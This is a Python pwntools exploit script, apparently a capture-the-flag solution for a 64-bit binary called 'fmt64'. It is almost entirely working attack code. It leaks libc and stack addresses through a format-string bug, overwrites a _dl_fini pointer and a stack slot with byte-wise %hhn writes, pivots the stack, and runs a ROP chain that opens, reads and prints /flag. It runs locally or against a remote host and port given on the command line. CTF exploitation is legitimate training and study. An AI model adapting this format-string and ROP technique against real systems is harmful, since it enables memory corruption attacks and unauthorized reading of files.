#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './fmt64'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '../libc-2.23.so'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

# context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

def leak_addr(pos):
    sl('LLLLLLLL%%%d$p'%(pos))
    return rc()[8:-1]

def show(addr):
    payload = "%10$s".ljust(24,'S')
    payload += p64(addr)
    sl(payload)
    return rc()

def alter_byte(addr,data):
    if data==0:
        payload = "%10$hhn"
    else:
        payload = "%%%dc%%10$hhn"%(data)
    payload = payload.ljust(24,'T')
    payload += p64(addr)
    sl(payload)
    return rc()

def alter_dw(addr,data):
    alter_byte(addr,data&0xff)
    alter_byte(addr+1,(data>>8)&0xff)
    alter_byte(addr+2,(data>>16)&0xff)
    alter_byte(addr+3,(data>>24)&0xff)

def alter_qw(addr,data):
    alter_dw(addr,data)
    alter_dw(addr+4,data>>32)

def flush(c='F'):
    sl(c*8+'\0'*0x80)
    rc()

# info
# elf, libc
ru('This\'s my mind!\n')

# leak libc base
offset___libc_start_main_ret = 0x20830
libc_base = int(leak_addr(46),16)-offset___libc_start_main_ret
info_addr('libc_base',libc_base)

# ld-2.23 dl_fini (function array)
ld_ptr = libc_base + 0x5f0f48  #_dl_fini
info_addr('ld_ptr',ld_ptr)
# option
info_addr('raw func in ptr',u64(show(ld_ptr)[:6]+'\x00\x00'))

# gadget
p6r   = 0x0013cc0f + libc_base
prsp  = 0x0000000000003838 + libc_base # pop rsp ; ret
prdi  = 0x0000000000021102 + libc_base # pop rdi ; ret
prsi  = 0x00000000000202e8 + libc_base # pop rsi ; ret
prdx  = 0x0000000000001b92 + libc_base # pop rdx ; ret
libc_open  = libc.symbols['open'] + libc_base
libc_read  = libc.symbols['read'] + libc_base
libc_write = libc.symbols['write'] + libc_base

flush()
# leak stack 
stack_base = int(leak_addr(41),16)
info_addr('stack_base',stack_base)

# calc pivot stack 
#pwndbg> p 0x7ffc3c28fc58-0x7ffc3c28fe40
#$1 = -488
prsp_addr  = stack_base - 488

# prepare to stack pivot
# g1
log.success("write p6r:"+hex(p6r)+" to "+hex(ld_ptr));
alter_dw(ld_ptr, p6r)
# g2
log.success("write prsp:"+hex(prsp)+ " to "+hex(prsp_addr));
alter_qw(prsp_addr, prsp)
# stack pivot to read buf

# start rop
ropchain = [
            # open('/flag',0,0x100)
            p64(prdi), p64(stack_base-112),# -> /flag
            p64(prsi), p64(0),
            p64(prdx), p64(0x100),
            p64(libc_open),
            # read(0,buf,0x100)
            p64(prdi), p64(3),
            p64(prsi), p64(stack_base),
            p64(prdx), p64(0x100),
            p64(libc_read),
            # write(1,buf,0x100)
            p64(prdi), p64(1),
            p64(prsi), p64(stack_base),
            p64(prdx), p64(0x100),
            p64(libc_write),
            p64(0xdeadbeef),
            '/flag\0\0\0'
]

# debug('b *'+hex(p6r))

flush('\x90')
sl(''.join(ropchain))

# close stdin to break loop (so one_gadget does not work)
# p.stdin.close()
# shutdown sent also work
p.shutdown("send") 

p.interactive()
